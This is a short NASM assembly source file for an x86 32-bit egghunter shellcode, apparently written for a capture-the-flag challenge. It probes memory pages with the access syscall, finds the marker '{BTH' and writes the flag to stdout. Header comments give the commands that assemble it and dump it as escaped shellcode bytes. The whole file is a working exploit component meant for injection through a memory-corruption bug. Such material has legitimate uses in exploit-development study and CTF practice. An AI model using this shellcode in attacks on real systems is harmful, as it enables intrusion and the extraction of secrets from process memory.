;x86 32-bit egghunter
;searches for a string in memory and writes it to stdout

;assembling the shellcode and dumping it in packed format
;nasm -f elf32 -o egghunter.o egghunter.S
;ld -m elf_i386 -o egghunter egghunter.o
;objdump -d ./egghunter | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d:| cut -f1-6 -d' ' | tr -s ' '| tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
;global _start

section .text


_start:
  push 0x3c               ; duration for arg1 of alarm()
  pop ebx
  push 0x1b               ; alarm syscall
  pop eax
  int 0x80
  mov edi, dword 0x7b425448  ; EGG. "{BTH". Little endian. Change this to be appropriate.

next_page:
  or dx, 0xfff            ; dx=4095 ; 0x1000 - 1 (4095) ; Page sizes in Linux x86 = 4096

next_address:
  inc edx                 ; edx = 4096
  pusha                   ; push all of the current general purposes registers onto the stack
  xor ecx, ecx
  lea ebx, [edx + 0x4]    ; address to be validated for memory violation
  mov al, 0x21            ; access systemcall
  int 0x80
  cmp al, 0xf2            ; compare return value, bad address = EFAULT (0xf2)
  popa                    ; get all the registers back
  jz next_page            ; jump to next page if EFAULT occurs
  cmp [edx], edi          ; compare string to egg
  jnz next_address        ; jump to next address if NOT egg
  mov ecx, edx            ; assign address of flag to arg2 o write()
  push 0x24               ; len of flag
  pop edx                 ; set len of flag to write
  push 0x1                ; set arg1 (fd) of write to stdout (1)
  pop ebx
  mov al, 0x4             ; write syscall
  int 0x80                ; syscall
